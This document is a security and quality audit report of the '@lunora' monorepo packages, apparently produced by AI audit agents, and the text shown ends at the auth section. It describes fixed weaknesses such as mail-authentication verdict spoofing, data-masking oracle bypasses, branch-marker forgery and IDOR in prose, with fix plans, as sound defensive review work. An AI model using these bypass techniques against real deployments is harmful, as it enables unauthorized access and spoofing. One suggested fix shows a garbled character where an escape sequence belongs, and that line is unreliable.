# Package Audit — full sweep of `packages/*`

> Generated 2026-07-10 on branch `claude/package-audit-improvements-qphsre`.
> Method: one independent read-only audit agent per package (42 packages, four axes: bugs, security,
> refactor/reuse, missing tests), followed by an adversarial verification agent for every finding
> initially rated high/critical in the bug or security category. Findings marked **confirmed** survived
> that adversarial pass; **refuted** means the verifier disproved the claim (kept for transparency);
> unmarked findings (medium/low, or non-bug/security) were not independently re-verified.

## Totals

- **225 findings** across 42 packages, plus **293 test-coverage gaps**.
- By severity (refuted excluded): 0 critical, 15 high, 84 medium, 125 low.
- By category: 133 bug, 25 security, 8 perf, 34 refactor, 24 reuse.

## Security remediation status

All 25 security-category findings were adversarially re-verified with a fix plan; **24 were confirmed
and fixed** (commit `2627966`, this branch), **1 was refuted** and left unchanged. Each fix is surgical
and ships a regression test; every changed package passes `lint:types`, ESLint, and its full Vitest suite.

| #   | Package                | Severity | Fix                                                                                            | Status    |
| --- | ---------------------- | -------- | ---------------------------------------------------------------------------------------------- | --------- |
| 1   | @lunora/mail           | high     | Read auth verdicts from the topmost `Authentication-Results`, not the last-wins map            | fixed     |
| 2   | @lunora/runtime        | high     | Batch RPC uses the `defineIdentity` contract-wrapped resolver                                  | fixed     |
| 3   | @lunora/server         | high     | Mask guards `aggregate`/`groupBy` where-filters as masked-column oracles                       | fixed     |
| 4   | @lunora/workflow       | high     | Reject reserved `__lunoraBranch` at create surfaces + prefix-validate the marker               | fixed     |
| 5   | @lunora/auth           | medium   | Weak `AUTH_SECRET` hard-fails on unset/HTTPS `baseURL`, not only HTTPS                         | fixed     |
| 6   | @lunora/browser        | medium   | Redirect-chain guard runs with `allowedHosts` under `allowPrivateTargets`                      | fixed     |
| 7   | @lunora/browser        | medium   | Sub-resource requests are SSRF-checked fail-closed                                             | fixed     |
| 8   | @lunora/do             | medium   | Reactive cache keys on the full identity (userId + claims)                                     | fixed     |
| 9   | @lunora/mcp            | medium   | Correct the inoperable least-privilege-token guidance (docs)                                   | fixed     |
| 10  | @lunora/payment        | medium   | Derive checkout customer from the store; ignore caller `customerId` (IDOR)                     | fixed     |
| 11  | @lunora/runtime        | medium   | WS upgrade strips all client `x-lunora-*` headers before re-setting trusted values             | fixed     |
| 12  | @lunora/server         | medium   | Mask guards `count` baseWhere and findMany/findFirst orderBy oracles                           | fixed     |
| 13  | @lunora/studio         | medium   | Neutralize CSV formula injection in grid export                                                | fixed     |
| 14  | @lunora/bindings       | low      | `Object.hasOwn` guards on registry lookups (prototype-key bypass)                              | fixed     |
| 15  | @lunora/cli            | low      | `import`/`backup restore --prod` require `--yes`                                               | fixed     |
| 16  | @lunora/cli            | low      | Update-notifier cache off shared `/tmp` → user-owned XDG dir + symlink guard                   | fixed     |
| 17  | @lunora/codegen        | low      | hardcoded-secret advisor detects `secret-literal + dynamic` concatenation                      | fixed     |
| 18  | @lunora/d1             | low      | Forbid eq-filter equality oracle on redacted external columns                                  | fixed     |
| 19  | @lunora/flags          | low      | Drop the raw env value from parse-error messages (secret leak)                                 | fixed     |
| 20  | @lunora/runtime        | low      | CORS preflight enforces the configured `allowedHeaders` allowlist                              | fixed     |
| 21  | @lunora/sql-store + do | low      | `_creationTime` server-authoritative on insert/replace unless trusted `allowExplicitId` opt-in | fixed     |
| 22  | @lunora/storage        | low      | Abort the stream when a non-byte chunk would defeat `maxSize`                                  | fixed     |
| 23  | @lunora/studio         | info     | Dev-host CSRF header — verifier **refuted** (dev-only, same-origin)                            | no change |
| 24  | @lunora/values         | low      | Redact the raw input literal from `.check()` ValidationError messages                          | fixed     |
| 25  | @lunora/vite           | low      | Refuse proxied (`X-Forwarded-*`) studio requests (admin-token leak)                            | fixed     |

Note: finding #21 also revealed that `replace()` had two legitimate trusted callers (CDC replay and
online data-migration) that must preserve a row's original `_creationTime`; the fix threads an
`allowExplicitId` opt-in through `replace` so those paths are preserved while the default client path
mints a server-authoritative timestamp. The non-security findings (bugs, refactors, perf, test gaps)
below remain open for follow-up.

## Highest-priority findings (verified high severity)

| Package                               | Severity | Category | Finding                                                                                                                                                         | Location                                               |
| ------------------------------------- | -------- | -------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| [@lunora/advisor](#lunoraadvisor)     | high     | perf     | Cycle-detection DFS is worst-case exponential and can hang codegen on realistic schemas                                                                         | `packages/advisor/src/lints/static/circular-fk.ts:141` |
| [@lunora/angular](#lunoraangular)     | high     | bug      | Angular SSR crashes: socket-opening primitives run in field initializers on the server, where Node >=22 has a global WebSocket                                  | `packages/angular/src/live-query.ts:68`                |
| [@lunora/client](#lunoraclient)       | high     | bug      | In-flight streams hang forever after a WebSocket disconnect                                                                                                     | `packages/client/src/lunora-client.ts:3681`            |
| [@lunora/db](#lunoradb)               | high     | bug      | syncedJson diff cache survives TanStack gc cleanup, leaving the collection permanently empty after a sync restart                                               | `packages/db/src/collection-options.ts:168`            |
| [@lunora/mail](#lunoramail)           | high     | security | Sender can spoof DKIM/SPF/DMARC verdicts via a duplicate Authentication-Results header (last-wins flattening)                                                   | `packages/mail/src/inbound/parse.ts:157`               |
| [@lunora/payment](#lunorapayment)     | high     | bug      | Polar createCheckout drops the customer linkage: ignores input.customerId and input.email, hardcodes customerEmail: undefined                                   | `packages/payment/src/providers/polar.ts:217`          |
| [@lunora/react](#lunorareact)         | high     | bug      | usePreloadedQuery masks a live null push with the stale preloaded value (`data ?? value`)                                                                       | `packages/react/src/use-preloaded-query.ts:60`         |
| [@lunora/runtime](#lunoraruntime)     | high     | security | Batch RPC path bypasses the defineIdentity contract validation gate                                                                                             | `packages/runtime/src/create-worker.ts:2531`           |
| [@lunora/scheduler](#lunorascheduler) | high     | bug      | Alarm-pass pool cache goes stale across the dispatch fetch await, clobbering concurrent /complete and permanently leaking pool slots                            | `packages/scheduler/src/scheduler-do.ts:606`           |
| [@lunora/server](#lunoraserver)       | high     | security | Masking bypass: aggregate/groupBy where-filters are unguarded value oracles                                                                                     | `packages/server/src/mask/middleware.ts:502`           |
| [@lunora/sql-store](#lunorasql-store) | high     | bug      | restore() double-inserts the rank companion row and throws a raw PK violation                                                                                   | `packages/sql-store/src/ctx-db.ts:3098`                |
| [@lunora/sql-store](#lunorasql-store) | high     | bug      | Indexed groupBy ignores a partially-constraining where and returns filtered-out groups                                                                          | `packages/sql-store/src/ctx-db.ts:2295`                |
| [@lunora/vite](#lunoravite)           | high     | bug      | Remote-binding dev never activates on the vite path: isServe() is evaluated eagerly at factory time                                                             | `packages/vite/src/remote-bindings-plugin.ts:113`      |
| [@lunora/vite](#lunoravite)           | high     | bug      | Emitted virtual worker entry embeds Windows backslash paths into JS import specifiers                                                                           | `packages/vite/src/framework-compose-plugin.ts:229`    |
| [@lunora/workflow](#lunoraworkflow)   | high     | security | Branch marker is trusted from workflow params — forged __lunoraBranch enables event spoofing into arbitrary workflow instances via arbitrary env-binding lookup | `packages/workflow/src/fan-out.ts:328`                 |

## Per-package findings

<a id="lunoraadvisor"></a>

### @lunora/advisor

**Assessment:** Overall a high-quality package: every lint is a pure, well-documented rule over a typed LintContext with consistent fail-silent guards, careful low-false-positive gating, and broad per-lint test coverage; the one network-adjacent module (ae-metrics) validates its dataset identifier and escapes SQL string literals correctly. The real defects are concentrated in wiring and worst-case behavior: two ERROR-level security lints are exported but never registered in STATIC_LINTS (so runAdvisor/codegen never runs them), the circular-FK detector is worst-case exponential (measured 26.7s on a 73-table acyclic schema, doubling per added diamond), and the runtime constraint-validator produces false dangling-FK findings on truncated samples and non-_id relation targets.

#### 1. [HIGH / perf] Cycle-detection DFS is worst-case exponential and can hang codegen on realistic schemas

`packages/advisor/src/lints/static/circular-fk.ts:141`

The DFS deliberately has no global visited/SCC decomposition (comment at lines 68-75) and is restarted from every table (line 157-159), so it enumerates every simple path in the relation graph. On a fully acyclic schema it emits zero findings but still walks all paths: a measured benchmark on a 73-table diamond-chain schema (each table with `one` relations to two tables that reconverge) took 26,691 ms, and each additional diamond doubles the time (~55 s at 76 tables, minutes beyond that). This lint runs inside runAdvisor at codegen time on every build, so a large schema with reconverging FK fan-out (many tables referencing shared parents in a chain) makes `lunora codegen`/`dev` appear to hang. The `reported` set only dedups emitted findings; it does not bound traversal.

**Suggested fix:** Replace the enumerate-all-paths DFS with Tarjan/Kosaraju SCC decomposition (any SCC with >1 node, or report one representative cycle per SCC via a bounded walk inside the SCC), which is O(V+E). If enumerating distinct cycles matters, use Johnson's algorithm with a cycle-count cap.

#### 2. [MEDIUM / bug] FK check reports false 'dangling FK' violations whenever the target table's sample is truncated

`packages/advisor/src/lints/runtime/constraint-validator.ts:59`

checkFkRelation flags a row when its FK value is missing from targetSample.existingIds (line 59), but existingIds is bounded to the sample cap (AdvisorTableSample docs: 'row ids of every existing row in this table (bounded to cap)'). When targetSample.truncated is true, a perfectly valid FK referencing a target row beyond the cap is reported as a dangling reference. The truncation is only surfaced as a suffix saying 'more rows may exist beyond the window' (lines 68-73) — which implies more violations, not that the listed ones may be valid — and the lint's remediation tells the operator to 'correct or remove the violating values'. Failure scenario: users has cap+1 rows; posts sampled rows referencing user #cap+1 are flagged as WARN constraint violations and an operator may delete/re-link valid data. The tests cover truncated-source caveat text but never a valid FK pointing past a truncated target.

**Suggested fix:** Skip the dangling-FK check (or downgrade to an explicit 'unverifiable' note) when targetSample.truncated is true — only a complete target id set can prove a reference dangling.

#### 3. [MEDIUM / bug] FK check ignores relation.references and always compares against the target's _id set

`packages/advisor/src/lints/runtime/constraint-validator.ts:41`

checkFkRelation compares each FK value against targetSample.existingIds, which is built from the target rows' _id column, but @lunora/server relations accept a custom referenced column: packages/server/src/schema.ts:180 defaults references to "_id" but allows any column (e.g. one("users", { field: "authorSlug", references: "slug" })). For such a relation every sampled row's value is checked against the wrong column's value set, so essentially all rows are reported as dangling FK violations. relation.references is never read anywhere in checkFkRelation (lines 31-62); the sibling static lints (relation_references_unknown_field) do handle references correctly.

**Suggested fix:** When relation.references !== "_id", either build a value set over the referenced column from targetSample.rows, or skip the check for non-_id references.

#### 4. [MEDIUM / bug] hot_shard computes shard share against the combined traffic of ALL shard groups, causing false negatives on multi-group feeds

`packages/advisor/src/lints/runtime/hot-shard.ts:51`

totalRequests is summed across every entry in context.shardTraffic regardless of shard.group (lines 50-51), and each shard's share is computed against that combined total. The AE feeder explicitly supports multi-group feeds (ae-metrics.ts loadShardTraffic groups by (shardKey, shardGroup) and reads 'the whole deployment's shard set' when options.group is omitted). With three sharded functions each served by a single 100%-hot shard, each shard's share of the combined total is ~33%, below HOT_SHARE_THRESHOLD, so genuinely hot shards in every group go unreported; conversely the active.length >= 2 gate is satisfied by shards from unrelated groups. Additionally the cacheKey `hot_shard:${shard.group ?? ""}:${shard.shardKey}` collapses a group:"" entry with a group:undefined entry.

**Suggested fix:** Partition shardTraffic by group first, then apply the active-count/MIN_TOTAL_REQUESTS/share logic per group.

#### 5. [LOW / bug] external_source_unscoped and external_source_on_global are exported but never registered in STATIC_LINTS, so they never run — **verified: confirmed**

`packages/advisor/src/index.ts:238`

STATIC_LINTS (index.ts:238-317) omits externalSourceUnscoped and externalSourceOnGlobal even though both are exported (index.ts:142-143) and fully implemented/tested. A registry diff confirms these are the only two exported lints absent from STATIC_LINTS/RUNTIME_LINTS. All real callers go through runAdvisor with default lints — packages/codegen/src/advisor.ts:200 calls runAdvisor(ctx, { source: "static" }) and the studio uses RUNTIME_LINTS — so neither lint ever executes. external_source_unscoped is an ERROR-level lint whose own docstring says a missing tenantBy on a .source()+.shardBy() table is "a cross-tenant data leak ... an ERROR that fails the build", yet an app with exactly that misconfiguration gets zero advisories and the build never fails. Tests only invoke the lints' .run() directly, so nothing catches the omission.

**Suggested fix:** Add both lints to STATIC_LINTS (imports at the top of index.ts plus two array entries), and add a registration-completeness test that asserts every `export { default as X } from "./lints/..."` entry appears in ALL_LINTS.

**Verifier note:** The mechanical claim is confirmed: externalSourceUnscoped and externalSourceOnGlobal are exported from packages/advisor/src/index.ts (lines 142-143) but are the only two exported lints absent from STATIC_LINTS/RUNTIME_LINTS/ALL_LINTS, and every production caller (codegen advisor.ts:200 via default lints, studio via RUNTIME_LINTS) uses the registered sets, so the lints never execute. The evidence pipeline built for them (codegen discover-schema.ts:478 parseSourceCall → codegen advisor.ts:94-99 externalSource forwarding) is dead plumbing, tests only call .run() directly, and packages/advisor/docs/index.mdx (lines 79, 160) lists both lints in the active-rules tables — so this is an unintentional omission, not a deliberate removal. HOWEVER, the claimed high-severity impact is refuted: packages/server/src/schema.ts:640-676 (validateExternalSources, called unconditionally by defineSchema at line 686) hard-THROWS on exactly both conditions — .source()+.global(), and .source()+.shardBy() without tenantBy — with the docstring stating this is 'a runtime guarantee, not merely the advisor lint's build-time warning'. An app with the misconfiguration cannot load its schema at all (lunora dev fails immediately with a clear remediation message), so the 'cross-tenant data leak ... gets zero advisories' scenario cannot occur. The advisor test file's docstring confirms the authors are aware of this fail-safe. Additionally, 'fails the build' was never implemented for ANY advisory: the CLI merely logger.warn's findings (cli/src/commands/codegen/handler.ts:66-70) and Vite shows an overlay — no ERROR finding gates a build. Even the unanalyzable-config WARN branch is superseded at runtime, since validateExternalSources inspects the real resolved config. Net effect of the bug: developers lose an earlier, friendlier advisory surface (Studio/dev-overlay at codegen time) and the docs advertise lints that never run — a real registration/docs-consistency defect, but with no security consequence and guaranteed loud failure via the runtime guard. Downgrade from high to low.

#### 6. [LOW / refactor] Per-line cacheKey collision handling exists only in hardcoded-secret; every other file:line-keyed lint collapses same-line findings

`packages/advisor/src/finding.ts:13`

hardcoded-secret.ts:39-49 adds an occurrence-counter suffix because 'two secrets ... on the same physical source line would otherwise share an identical cacheKey and collapse to one dismissible finding, hiding the second'. The same collision exists in every other lint keyed on `name:file:line` (kv_unscoped_user_key_idor, sql_injection_risk, flag_gates_security_with_unsafe_default, http_action_response_header_injection, and all makeArgumentDerivedSinkLint-based lints): two evidence rows on one line emit two findings with identical cacheKeys, and per the Finding contract (types.ts:95, dedup/dismissal id) the studio dedups them to one, hiding the second ERROR. Since the fix already exists once, it should be shared.

**Suggested fix:** Move the occurrence-suffix logic into finding.ts (e.g. an emitAll helper or a dedup pass in runAdvisor that suffixes duplicate cacheKeys) and delete the hand-rolled copy in hardcoded-secret.

#### 7. [LOW / refactor] Raw NUL bytes embedded in template literals make ae-metrics.ts a 'binary' file to standard tooling

`packages/advisor/src/ae-metrics.ts:206`

Lines 206 and 208 use a literal U+0000 character (not the \0 escape) as the separator in the `${hit.table}<NUL>${hit.index}` dedup keys. The behavior is correct (an unambiguous delimiter), but the raw control byte makes grep report 'binary file matches' for the whole file, and diff/blame/editor tooling can degrade similarly — during this audit the file was unsearchable with line output. The rendered source is also misleading: the NUL displays as a space, so the code reads as a space-delimited key.

**Suggested fix:** Replace the raw byte with the escape sequence (`${hit.table}�${hit.index}`) or a printable delimiter that cannot appear in AE blob values.

#### Missing test coverage

- No registration-completeness test asserting every exported lint appears in STATIC_LINTS/RUNTIME_LINTS/ALL_LINTS — exactly the check that would have caught the unregistered external-source lints (tests import the two lints directly and only call .run()).
- constraint_validator: no test that a valid FK pointing at a target row beyond a truncated target sample is NOT reported as dangling (the current behavior wrongly reports it), and no test for a relation with references !== "_id".
- hot_shard: no test feeding shardTraffic rows from multiple groups — per-group vs deployment-wide share computation is untested, and the group:"" vs group:undefined cacheKey collision is unexercised.
- circular_fk: tests cover 2/3-node cycles, chords, and self-references, but nothing bounds runtime on a dense/diamond acyclic graph (a ~70-table reconverging schema takes ~27s today; a perf-regression test would lock in any algorithmic fix).
- ae-metrics sqlString: the backslash-escape case is tested, but single-quote doubling (options.group containing ') — the primary SQL-literal escape — has no test.
- runAdvisor options.lints override combined with source filtering (passing a custom lints array whose source differs from options.source) is untested; only default-array paths are exercised.
- finding.ts emit(): per-occurrence overrides of categories/facing/level are exercised only incidentally via index-utilization; no direct unit test of the overlay precedence.

<a id="lunoraai"></a>

### @lunora/ai

**Assessment:** @lunora/ai is a clean, thin, well-documented wrapper over workers-ai-provider with good test coverage of every resolution branch (string id vs BYO model, defaultModel fallback, missing-binding guards, gateway threading via a module mock). No security issues — it handles no external/untrusted input, no secrets, and no I/O beyond delegating to the injected binding/provider; only two low-severity footguns survived review.

#### 1. [LOW / bug] embeddingModel() falls back to the shared language-model defaultModel, deferring a config error to inference time

`packages/ai/src/create-ai.ts:85`

embeddingModel() resolves `input ?? defaultModel` (create-ai.ts:85), where `defaultModel` is the single option documented for both model() and embeddingModel() (types.ts:44-47). An app that sets `defaultModel: "@cf/meta/llama-3.3-70b-instruct-fp8-fast"` for text generation and later calls `embed({ model: ctx.ai.embeddingModel() })` gets the LLM id silently passed to `textEmbeddingModel(...)` — no local error, just an opaque Workers AI failure at inference time (wrong model family). A language-model default and an embedding-model default are never the same id in practice, so the shared fallback can only misfire.

**Suggested fix:** Add a separate `defaultEmbeddingModel` option and stop reusing the language-model default in embeddingModel(); keep the existing clear 'no embedding model supplied' LunoraError when neither is set.

#### 2. [LOW / refactor] resolveEmbeddingModel throws a raw TypeError while every sibling guard throws LunoraError

`packages/ai/src/create-ai.ts:65`

The missing-`textEmbeddingModel` guard throws `new TypeError(...)` (create-ai.ts:65-68), but the three other misconfiguration guards in the same file (lines 40, 50, 88, 99) all throw `LunoraError("INTERNAL", ...)`. A TypeError fails `isLunoraError`, so the runtime's `toErrorBody` treats it as an unrecognized throw (fallbackCode path, packages/errors/src/to-error-body.ts:77) and the CLI's `renderLunoraError` can't render its catalog title/hint — the developer sees a generic redacted 500 with no hint instead of the curated error the sibling paths produce.

**Suggested fix:** Throw `new LunoraError("INTERNAL", ...)` like the other guards (optionally with `{ name: "TypeError" }` if the name matters).

#### Missing test coverage

- Error identity: all throw-path tests assert only message regexes (create-ai.test.ts:49, 86, 114, 129, 147) — none asserts the thrown value is a LunoraError with code "INTERNAL", so a regression to a plain Error (changing toErrorBody wire redaction and CLI rendering) would pass the whole suite.
- Package entry re-exports: nothing imports src/index.ts — a broken re-export of `embed`/`generateObject`/`streamObject`/`createWorkersAI` (e.g. an AI SDK v6 rename) would only surface in consuming apps; a smoke test importing each named export from the entry would catch it.
- run() on a binding-only createAi: `run` is only exercised with both `binding` and `provider` supplied (create-ai.test.ts:136); the zero-config `createAi({ binding }).run(...)` combination — the documented default path — is never driven end-to-end.
- embeddingModel() defaultModel fallback on a provider lacking textEmbeddingModel: the TypeError guard is only tested with an explicit id (create-ai.test.ts:110-115), not via the `input === undefined` → defaultModel route through resolveEmbeddingModel.

<a id="lunoraangular"></a>

### @lunora/angular

**Assessment:** @lunora/angular is a well-structured, thin signal adapter with clean teardown discipline (every primitive wires DestroyRef), good happy-path test coverage, and no security-relevant surface (no untrusted-input parsing, no secrets, no injection sinks). The two real risks are an SSR-breaking assumption — socket-opening primitives run in component field initializers during Angular server rendering, where Node 22+'s global WebSocket makes the client actually attempt (and crash on) a relative-URL socket — and a reentrancy hazard in the hand-copied pagination engine when the client replays cached values synchronously, which can permanently leak live subscriptions.

#### 1. [HIGH / bug] Angular SSR crashes: socket-opening primitives run in field initializers on the server, where Node >=22 has a global WebSocket — **verified: confirmed**

`packages/angular/src/live-query.ts:68`

Angular SSR executes component field initializers, so `liveQuery` / `subscription` / `paginatedQuery` / `presence` / `hydratePreloaded` all call `client.subscribe(...)` during a server render. The safety rationale in packages/angular/src/client.ts:13-18 ('the reactive primitives open their WebSocket lazily in the browser — an SSR render never issues a request') is false on this repo's supported Node range (^22.15): Node 22+ ships a global `WebSocket`, so LunoraClient's constructor picks it up (packages/client/src/lunora-client.ts:768) and `ensureSocket` (line 3519) is NOT a no-op on the server. With the default `sameOriginUrl()` fallback of "" (client.ts:20), `wsUrl` becomes the relative "/_lunora/ws", and `new WebSocket("/_lunora/ws")` in Node throws a synchronous SyntaxError (undici requires an absolute ws:/wss: URL). `createQuerySubscription` rethrows attach errors when no `onError` sink is wired (packages/client/src/query/query-subscription.ts:115-117), so component construction throws and the whole SSR render fails. Even with an absolute `url` configured, every SSR render silently opens a real WebSocket from the server. Only `flag`/`flags` survive (they wrap the attach in try/catch). No `PLATFORM_ID`/`isPlatformBrowser` guard exists anywhere in the package, yet SSR is an advertised scenario (`hydratePreloaded` exists specifically for the SSR handoff).

**Suggested fix:** Gate the subscription attach on the browser platform (inject PLATFORM_ID / isPlatformBrowser, or check for `location`) in each socket-opening primitive, leaving signals at their initial value during SSR — matching the documented 'lazily in the browser' contract. Alternatively fix at the source: make provideLunora pass `WebSocket: undefined` to the client when not in a browser.

**Verifier note:** Verified end-to-end. (1) LunoraClient picks up the global WebSocket when none is passed (packages/client/src/lunora-client.ts:768); confirmed on Node v22.22.2 (repo's supported range) that global WebSocket exists and `new WebSocket('/_lunora/ws')` throws a synchronous SyntaxError (Invalid URL). (2) The Angular adapter's default client uses sameOriginUrl() → "" on the server (packages/angular/src/client.ts:20,34), making wsUrl the relative "/_lunora/ws" (lunora-client.ts:319-335,762). (3) client.subscribe synchronously calls ensureSocket (line 2555 → 3519), which does `new this.WebSocketImpl(...)` at line 3533 with no try/catch — not a no-op on Node 22+. (4) Angular SSR runs component field initializers, the exact call site liveQuery's docs recommend; no PLATFORM_ID/isPlatformBrowser/typeof-window guard exists anywhere in packages/angular/src. (5) createQuerySubscription rethrows attach errors when no onError sink is wired (query-subscription.ts:115-117), so liveQuery/subscription crash construction; hydratePreloaded, presence, and paginatedQuery call client.subscribe directly with no wrapper at all, so they crash even with an error callback — slightly worse than claimed. Only flag/flags wrap the attach in try/catch. (6) SSR is advertised: client.ts:13-18 explicitly (and falsely, on Node 22+) claims "an SSR render never issues a request", and hydratePreloaded is documented as the SSR reactive-loader handoff. (7) With an absolute url configured, each SSR render opens a real server WebSocket that the DestroyRef teardown never closes (subscribe's unsubscribe removes the subscription, not the socket). No tests pin any SSR-safe behavior (tests use a fake client). High severity stands: default-configured Angular SSR apps fail the whole server render on the first live primitive.

#### 2. [MEDIUM / bug] Reentrant syncSubscriptions on synchronous cached replay leaks/duplicates page subscriptions

`packages/angular/src/paginated-query.ts:159`

`client.subscribe` replays a cached value to the new subscriber synchronously, before returning the unsubscribe handle (packages/client/src/lunora-client.ts:2546-2553). In `syncSubscriptions`, that callback therefore runs before `entry.unsub = unsub` (line 180) and before `activeSubs.set(key, entry)` (line 181). If the replay makes `pendingPageKeys` empty and `rebalance` returns a new page list (a cached bounded page grown past SPLIT_FACTOR x numItems, or shrunk below JOIN_FACTOR), the callback calls `syncSubscriptions(next)` reentrantly (line 166) against incomplete bookkeeping: the in-flight entry is invisible to both the close-stale loop and `coveredKeys`, so (a) the reentrant call opens a second subscription for any still-wanted key, and when the outer frame resumes, `activeSubs.set(key, entry)` at line 181 overwrites the reentrant entry — its unsubscribe handle is lost forever, surviving even DestroyRef teardown (which only iterates `activeSubs`, lines 193-200); and (b) if the key was split away, the outer frame registers a subscription for a page that no longer exists, which streams updates into `resultsByKey` under a dead key until destroy. The Vue twin avoids this by deferring re-sync through `watch(pages)` scheduling (packages/vue/src/use-paginated-core.ts:213-223); the Angular port made the recursion synchronous.

**Suggested fix:** Defer the rebalance re-sync out of the subscribe callback (queueMicrotask, or a dirty-flag drained after the syncSubscriptions loop), or assign `entry.unsub`/`activeSubs.set(key, entry)` BEFORE calling `client.subscribe` is impossible — instead set the entry into `activeSubs` before subscribing and patch `unsub` after, so reentrant passes see it.

#### 3. [MEDIUM / reuse] Fourth hand-copied pagination engine — already drifting from the Vue/Solid/Svelte copies

`packages/angular/src/paginated-query.ts:39`

`usePaginatedCore` (~210 LOC: buildPageKey/buildPageArgs at lines 23-30, SubEntry, migrateResultsForRebalance, syncSubscriptions, loadMore) is a near-verbatim copy of packages/vue/src/use-paginated-core.ts, packages/solid/src/create-paginated-query.ts, and packages/svelte/src/paginated-query.ts; only the reactive cell (signal vs ref vs store) differs. The copies have already diverged: Vue's loadMore re-keys the pinned tail subscription in place via the mutable `entry.currentKey` (vue/use-paginated-core.ts:268-281) while Angular closes and reopens it (lines 226-242) — yet Angular kept Vue's now-false doc comment ('currentKey is mutable so that when loadMore re-keys a pinned page...', lines 62-66); `currentKey` is never mutated in this file. The pure state machine already lives in @lunora/client/pagination — the imperative subscription-sync shell belongs beside it.

**Suggested fix:** Hoist the subscription-sync engine (key building, activeSubs/resultsByKey/pendingPageKeys, rebalance migration, loadMore re-keying) into @lunora/client/pagination parameterized over tiny get/set cell callbacks; each adapter shrinks to ~40 lines of glue, and the reentrancy fix from the previous finding lands once for all four frameworks.

#### 4. [LOW / perf] Presence heartbeat interval runs inside the Angular zone, triggering app-wide change detection every 10s with no state change

`packages/angular/src/presence.ts:111`

`setInterval(sendHeartbeat, intervalMs)` (line 111) is created in the injection context, so in zone-based apps every tick (default 10s) plus each heartbeat's `mutation(...).catch()` microtask runs inside NgZone and schedules a full change-detection pass — yet `sendHeartbeat` writes no signal and changes no view state (only the `listPresent` subscription pushes do, and those arrive via the socket independently). For a component-heavy app this is a steady CD churn for a pure network side effect. The visibilitychange listener (line 120) has the same property.

**Suggested fix:** Inject NgZone (already a peer-dep surface) and wrap the interval + visibilitychange registration in `zone.runOutsideAngular(...)`; signal writes from the subscription callback still notify views correctly.

#### 5. [LOW / refactor] Dead `epoch` signal with a misleading comment

`packages/angular/src/rate-limit.ts:66`

`epoch` is declared at line 66 and incremented in `bump()` (line 73) but never read by any computed/effect — the comment ('the status signal is re-evaluated whenever epoch changes (via a reactive computation)') describes a design that does not exist. `status` is a plain signal set imperatively at line 74; all derived signals (`ok`, `disabled`, `retryAfter`) read `status()` directly. The epoch signal allocates and notifies for nothing on every consume/tick.

**Suggested fix:** Delete the `epoch` signal and the `epoch.update` call in `bump()`, leaving `status.set(computeStatus())`.

#### 6. [LOW / refactor] `InfiniteQueryOptions` is dead: declared, never used, never re-exported

`packages/angular/src/paginated-query.ts:282`

The `InfiniteQueryOptions` interface (lines 282-294) duplicates `PaginatedQueryOptions` field-for-field, but `infiniteQuery` takes `PaginatedQueryOptions` (line 382) and src/index.ts re-exports only `InfiniteQueryResult` (line 34), not the options type. Consumers can't reach it and nothing consumes it internally.

**Suggested fix:** Either delete the interface, or have `infiniteQuery` accept it and export it from index.ts (its docstrings say 'fetchNextPage' where PaginatedQueryOptions says 'loadMore', so wiring it up would also fix the doc mismatch).

#### Missing test coverage

- paginated-query rebalance (split/join) is entirely untested: the rebalance branch of the subscribe callback (src/paginated-query.ts:159-169) and migrateResultsForRebalance are never exercised — the fake client never supplies splitCursor or oversized/undersized page results
- synchronous cached replay: **tests**/fake-client.ts subscribe never invokes the callback before returning, so the signal-seeded-before-return behavior and the reentrant syncSubscriptions path are uncovered for every primitive
- paginated-query per-page onError branch (src/paginated-query.ts:172-175): pendingPageKeys removal and status derivation after a page subscription error are untested
- flag/flags post-attach error channel (src/flag.ts:89-92 and 148-150) resetting the value to the default — only the attach-throw fail-open path is tested, and flags() has no failure test at all
- presence visibilitychange re-focus heartbeat (src/presence.ts:113-121) and the intervalMs RangeError validation (src/presence.ts:82-84) have no tests
- infiniteQuery's hasNextPage / isFetchingNextPage signals and fetchNextPage's default numItems (falls back to initialNumItems, src/paginated-query.ts:403-405) are untested — only first-page load and one append are covered
- provideLunora variants are untested: passing a pre-built LunoraClient instance (src/client.ts:66-68) and the same-origin/"" URL default (src/client.ts:20, 70) are never asserted

<a id="lunoraastro"></a>

### @lunora/astro

**Assessment:** A very clean, minimal package: two thin re-export seams over @lunora/runtime and @lunora/client/ssr (both verified to exist and behave as documented) plus a deliberately-minimal Astro integration object, with no bugs or security-relevant code paths of its own. The only substantive issue is that the integration's serverEntry option is functionally dead while the docs imply it wires the build, and the test suite misses two contracts (options-factory form, scheduled preservation) that the sibling vue/svelte adapter suites do cover.

#### 1. [LOW / refactor] serverEntry option is dead code with a misleading contract and a weak guard

`packages/astro/src/integration.ts:85`

The `serverEntry` option is accepted (line 39) but its only use is the `serverEntry.length === 0` check inside the astro:config:done hook (line 85) — it never influences the build, is never resolved against the project, and its existence is never validated. Meanwhile src/with-lunora.ts lines 41-42 tell users "The `lunora()` integration (from this package) declares the build-time wiring so templates don't hand-roll it", which overstates what the integration does: a user who passes `serverEntry: "src/my-worker.ts"` (or a typo'd path) gets zero behavior — wrangler's `main` is still the only thing that matters — and the typo passes silently. Additionally the guard only rejects the empty string, so `lunora({ serverEntry: " " })` (whitespace-only) passes the non-empty check the in-code comment says exists to avoid "silently composing a worker against an unresolvable entry".

**Suggested fix:** Either drop the option until the build-time wiring actually lands (the hook comment admits it is a placeholder), or at minimum trim before the emptiness check and soften the with-lunora.ts doc line so it doesn't claim wiring the integration doesn't perform.

#### Missing test coverage

- withLunora with the (env) => ({ shardDO: env.SHARD }) options-factory form — the exact usage the Astro 6 injection-point example in src/with-lunora.ts lines 33-36 tells users to write — is never exercised in packages/astro/**tests**/with-lunora.test.ts (all four routing tests pass a fixed options object; packages/svelte/**tests**/worker.test.ts covers the factory for its alias, astro does not).
- Preservation of the Astro adapter's own `scheduled` handler when no Lunora crons are configured — explicitly promised in src/with-lunora.ts line 20 — has no test in this package (packages/vue/**tests**/with-lunora.test.ts locks this contract for the Nitro alias; the astro suite never passes a { fetch, scheduled } host object).
- No test routes /_lunora/ws (or /_lunora/admin/*) through the composed Astro worker — only /_lunora/rpc is exercised, so the WebSocket-upgrade reservation claimed in src/with-lunora.ts lines 8-9 is untested at this seam.
- integration.ts: no test pins the whitespace-only serverEntry case (`lunora({ serverEntry: " " })` currently passes the non-empty guard), so the intended semantics of the astro:config:done validation are ambiguous.

<a id="lunoraauth"></a>

### @lunora/auth

